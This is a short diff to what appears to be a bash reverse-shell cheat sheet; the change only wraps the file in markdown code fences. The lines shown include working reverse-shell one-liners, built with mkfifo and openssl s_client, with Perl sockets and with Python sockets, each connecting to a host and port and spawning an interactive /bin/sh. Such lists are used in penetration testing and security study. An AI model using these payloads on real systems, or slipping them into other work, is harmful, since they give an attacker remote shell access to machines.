@@ -1,3 +1,4 @@
+```
 #!/bin/bash
 # sed (GNU sed) 4.9
 # GNU Awk 5.2.1, API 3.2, (GNU MPFR 4.2.0, GNU MP 6.2.1)
@@ -53,3 +54,4 @@ mkfifo f ; sh -i < f 2>&1 | openssl s_client -quiet -connect 127.0.0.1:1234 > f
 perl -e 'use Socket;$i="127.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+```
